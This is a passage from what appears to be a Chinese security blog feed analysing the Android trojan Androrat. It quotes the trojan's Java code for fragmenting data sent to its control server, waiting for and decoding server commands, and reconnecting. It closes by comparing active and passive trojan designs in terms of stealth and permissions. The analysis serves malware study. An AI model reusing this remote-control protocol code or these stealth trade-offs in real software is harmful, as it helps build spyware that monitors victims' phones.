				&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

				
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;HEADER_LENGTH_DATA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MAX_PACKET_SIZE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;HEADER_LENGTH_DATA&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointeurData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)];&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;envoieTotal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MAX_PACKET_SIZE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
				
				
				&lt;span class=&quot;n&quot;&gt;actualLenght&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;HEADER_LENGTH_DATA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;


				&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fragData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;HEADER_LENGTH_DATA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;arraycopy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointeurData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fragData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fragData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TransportPacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actualLenght&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;last&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;numSeq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fragData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
				
				&lt;span class=&quot;n&quot;&gt;pointeurData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointeurData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actualLenght&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;numSeq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pointeurData&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;MAX_PACKET_SIZE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;HEADER_LENGTH_DATA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;last&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				
				&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dataToSend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NullPointerException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Ce channel n'est pas index&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;和上一篇文章讲解码的过程差不多，先判断数据+头部的大小是否超过包的最大值（2048）。如果未超过则构造数据+头部大小的byte数组，last位（参见上一篇文章的服务端发送指令格式）置为true，actualLenght值为发送大小减头部长度。创建fragData数组大小为本次传输的数据大小，将本次传输的内容从存储源数据的data移动到fragData中，然后实例化TransportPacket对象，使用它的build方法来生成传输信息。&lt;/p&gt;

&lt;p&gt;若数据+头部的大小超过包的最大值，则last置false，其他操作不变，循环发送直至数据发送完毕。&lt;/p&gt;

&lt;p&gt;最后我们可以得到返回数据的结构如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-04/hexdump.png&quot; alt=&quot;hexdump&quot; /&gt;&lt;/p&gt;

&lt;p&gt;切割后内容与服务端发送指令格式一样&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;totalLength  :00 00 00 28  ==》总共长度，如果分片传递则大于localLength 
localLength  :00 00 00 28  ==》本包长度 
lst          :01           ==》是否为最后一个包 
NumSeq       :00 00        ==》如果是分片，则表示此包为第几个数据包 
channel      :00 00 00 01  ==》服务端所使用的频道 
Data         : …………        ==》数据部分
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;0x02-程序结构&quot;&gt;0x02 程序结构&lt;/h2&gt;

&lt;p&gt;按理说程序结构图这部分应该放在第一篇文章中的，不过由于那时对这个程序还没有了解透彻，所以就拖到了最后这篇收尾文章中。如果这我的三篇文章都仔细看过，下面这张图就很好理解，废话不多说直接看图吧：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2017-04/structure.png&quot; alt=&quot;structure&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x03-总结&quot;&gt;0x03 总结&lt;/h2&gt;

&lt;p&gt;在分析这个程序的期间，还穿插了对一个恶意apk样本（Xiangce）的分析，对比这两个apk发现Android木马可以针对服务端的响应分为主动式和被动式。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;被动式：服务端只负责接收客户端返回信息，所需要的功能都在apk生成时确   定，生成后不再可以修改。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;主动式：服务端主动发送操控命令，客户端响应命令回传数据，也向客户端发送转换为被动式的命令，例如，当收到短信时向服务端发送此条信息。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;两种分类中，主动式由于功能大而全，所以需要申请过多的权限，容易在安装时被察觉。被动式功能固定伪装性好，不过灵活性相对较差。Xiangce这个恶意样本是一个偏被动式的恶意样本，功能固定在短信和电话接听这两个主要的方面，之所以说是偏被动，是因为在其功能中有一些需要通过短信发送的方式进行操控的地方。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>剖析安卓木马Androrat（二）</title>
   <link href="http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E4%BA%8C.html"/>
   <updated>2017-04-09T02:05:34+08:00</updated>
   <id>http://localhost:4000/%E6%8A%80%E6%9C%AF/2017/04/09/剖析安卓木马Androrat（二）</id>
   <content type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;p&gt;上一篇文章我们分析了Androrat这个木马的Client核心代码，这次我们来聊一聊它是如何解析服务端发过来的命令然后执行的。&lt;/p&gt;

&lt;h2 id=&quot;0x01-代码分析&quot;&gt;0x01 代码分析&lt;/h2&gt;

&lt;p&gt;首先我们从上篇文章中提到的onStartCommand函数的这段代码来开始：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;readthread&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;waitInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;起一个线程运行waitInstruction方法，这个方法顾名思义，客户端等待服务端的指令，下面让我们来看一下代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;waitInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//Le thread sera bloqué dedans&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(;;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; 
			&lt;span class=&quot;n&quot;&gt;isListening&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;resetConnectionAttempts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;reconnectionAttempts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;waitTrigger&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;registerSMSAndCall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;循环执行Connection的getInstruction来接收指令，直到stop成员变量被置为true。如果抛出异常，则尝试重新连接到服务端。下面我们接着来看Connection的getInstruction代码：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;readInstruction&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;receive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;readInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compact&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;readInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clear&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
		
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readInstruction&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;读取缓冲区中的数据，然后解码输入数据，判断解码是否成功，最后返回空缓冲区。用于解码输入数据的receive方法的代码如下：&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;boolean&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;receive&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ByteBuffer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			
	
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partialDataExpected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;c1&quot;&gt;//si on n'attend pas de donn�es partielles(dans le cas d'un paquet pas re�ue enti�rement)&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;	
						&lt;span class=&quot;c1&quot;&gt;// si la taille du buffer est insuffisante&lt;/span&gt;
						&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;limit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Protocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;HEADER_LENGTH_DATA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
						&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
							
							&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
						&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	
				&lt;span class=&quot;c1&quot;&gt;// dans le cas d'un paquet partiellement recue&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partialDataExpected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;partialDataExpected&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseCompleter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; 
				&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TransportPacket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;partialDataExpected&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
				&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
				
				
				
				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partialDataExpected&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
					&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
					&lt;span class=&quot;n&quot;&gt;controler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Storage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imei&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
			
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;


